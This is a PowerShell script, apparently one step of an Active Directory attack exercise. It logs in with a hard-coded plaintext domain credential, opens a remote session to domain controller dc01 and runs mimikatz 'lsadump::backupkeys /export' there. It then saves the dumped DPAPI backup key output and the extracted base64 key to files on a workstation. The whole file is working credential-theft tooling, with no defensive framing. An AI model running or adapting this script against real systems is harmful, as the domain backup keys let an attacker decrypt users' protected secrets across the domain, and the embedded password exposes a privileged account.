# 3.5G step1c: capture FULL backupkeys output on dc01 -> extract base64 key to ws01
$ErrorActionPreference = 'Continue'

$cred = New-Object System.Management.Automation.PSCredential('cadre.local\chief_command', (ConvertTo-SecureString 'C0mm@nd_Ch1ef!' -AsPlainText -Force))
try {
    $s = New-PSSession -ComputerName 'dc01.cadre.local' -Credential $cred -ErrorAction Stop
    $out = Invoke-Command -Session $s -ScriptBlock {
        Set-Location C:\Windows\Temp
        & .\mimikatz.exe 'lsadump::backupkeys /export' 'exit' 2>&1
    }
    # write full output to ws01 file
    $out | Set-Content 'C:\Tools\ADTools\wt035g-backupkeys-full.txt'
    Write-Output "FULL_OUT_SIZE $($out.Count) lines"

    # find the base64 lines
    $b64lines = $out | Select-String -Pattern 'base64|Preferred backup key|GUID' 
    $b64lines | Select-Object -First 10 | ForEach-Object { Write-Output "BK|$($_.Line)" }

    # extract base64 (long line after 'base64')
    $capture = $false
    foreach ($l in $out) {
        if ($l -match 'base64') { $capture = $true; continue }
        if ($capture -and $l -match '^[A-Za-z0-9+/=]{100,}$') {
            $l.Trim() | Set-Content 'C:\Tools\ADTools\wt035g-backupkey-base64.txt'
            Write-Output "B64_SAVED_LEN $($l.Trim().Length)"
            break
        }
    }
    Remove-PSSession $s
} catch { Write-Output "DC01_ERR|$($_.Exception.Message)" }
Write-Output '3.5G_STEP1C_DONE'
